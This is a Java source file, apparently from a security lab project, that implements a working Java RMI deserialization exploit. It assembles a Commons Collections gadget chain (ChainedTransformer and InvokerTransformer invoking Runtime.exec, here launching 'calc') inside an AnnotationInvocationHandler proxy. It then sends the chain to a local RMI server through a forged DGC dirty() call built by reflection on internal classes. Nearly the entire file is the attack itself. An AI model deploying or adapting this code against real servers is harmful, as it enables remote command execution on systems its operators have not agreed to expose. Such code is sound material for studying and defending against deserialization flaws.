package org.trganda.client;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.trganda.remote.RemoteService;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.*;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.*;
import java.lang.reflect.*;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIClient2ServerDGC {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public RemoteService getRemoteService(String name) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        try {
            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            Field operations = registry.getClass().getDeclaredField("operations");
            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");

            ref.setAccessible(true);
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);
            RemoteRef refs = (RemoteRef) ref.get(registry);

            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);

            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(name);

            invoke.invoke(refs, call);

            return (RemoteService) call.getInputStream().readObject();

        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }

    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);

        try {
            // get remote service
            RemoteService rs = getRemoteService(name);

            // get unicastref info, include target ip:port and ObjID
            Field h = rs.getClass().getSuperclass().getDeclaredField("h");
            h.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) h.get(rs);

            Field ref = handler.getClass().getSuperclass().getDeclaredField("ref");
            ref.setAccessible(true);
            UnicastRef unicastRef = (UnicastRef) ref.get(handler);

            LiveRef innerLiveRef = unicastRef.getLiveRef();
            // Get the target tcpendpoint
            Field ep = innerLiveRef.getClass().getDeclaredField("ep");
            ep.setAccessible(true);
            TCPEndpoint tcpEndpoint = (TCPEndpoint) ep.get(innerLiveRef);
            // Get the unicastRef ObjID to refer target DGCImpl_Skel
            Class a = Class.forName("sun.rmi.transport.DGCClient");
            Field f = a.getDeclaredField("dgcID");
            f.setAccessible(true);
            ObjID dgcID = (ObjID) f.get(null);

            LiveRef targetLiveRef = new LiveRef(dgcID, tcpEndpoint, false);
            // Create a DGCImpl_Stub object
            Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
            Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(new UnicastRef(targetLiveRef));

            Field operations = stub.getClass().getDeclaredField("operations");
            Field interfaceHash = stub.getClass().getDeclaredField("interfaceHash");
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);

            // write evil data
            RemoteCall call = stub.getRef().newCall((RemoteObject) stub, (Operation[]) operations.get(stub), 1, (Long) interfaceHash.get(stub));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(create());

            // call dirty()
            stub.getRef().invoke(call);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2ServerDGC rc = new EvilRMIClient2ServerDGC();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
